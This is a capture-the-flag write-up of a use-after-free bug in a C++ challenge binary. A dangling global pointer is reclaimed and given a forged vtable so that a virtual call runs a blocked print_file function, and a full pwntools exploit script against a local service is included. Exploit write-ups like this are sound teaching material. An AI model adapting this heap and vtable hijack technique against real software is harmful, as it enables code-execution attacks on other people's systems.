## Solution

### Quick overview

The bug is coming from `destroy_glb_storage()` : it calls delete `glb_storage` but never sets it to NULL, the destructor will delete (the "free" in use-after-free) the pointer, meaning we have a dangling ptr. Classic UAF.

`add_buf` allows us to do a malloc and modify the newly allocated memory. (the "use" in use-after-free)
It will be useful to pick up the freshly freed chunk, then modify it with our own data to make the vptr point to a custom vtable.

### No win function ? No problem

The only step left is to trigger a call to the vtable, to do this we will use the `set_glb_storage()` func which calls `A::f()`, this way it will trigger controlled function using our custom vtable. To solve this challenge we will call the `print_file()` which was unreachable (manually blocked as "not supported yet")

Disassembling `setup_global_storage()` we see how much data cpp requires under the hood :

## Solution script

```py
from pwn import *

FLAG_FILE = b"flag"
CHUNK_SIZE = 0x68 # calculated size of A instance's chunks
PAYLOAD = p64(0x404110) # address of pointer to print_file - 0x10 (because set_glb_storage() calls *(glb_storage + 0x10)) 

t = remote("localhost", 9000)

def menu(choice):
    t.recvuntil(b'Action: ')
    t.sendline(str(choice).encode())

def main():
    # Instanciate A into glb_storage
    menu(0)

    # Destroy it -> glb_storage freed but not zeroed
    menu(1)

    # Reclaim the freed chunk
    menu(3)

    t.recvuntil(b'Enter value: ')
    t.sendline(str(CHUNK_SIZE).encode())

    t.recvuntil(b'Enter value: ')
    t.send(PAYLOAD)

    # Trigger: set_glb_storage calls (*glb_storage+0x10)(data, size) -> calls print_file(data, size)
    menu(2)
    t.send(FLAG_FILE + b"\x00")

    # Print flag
    print(t.recv(timeout=3).decode(errors='replace'))

if __name__ == "__main__":
    main()
```
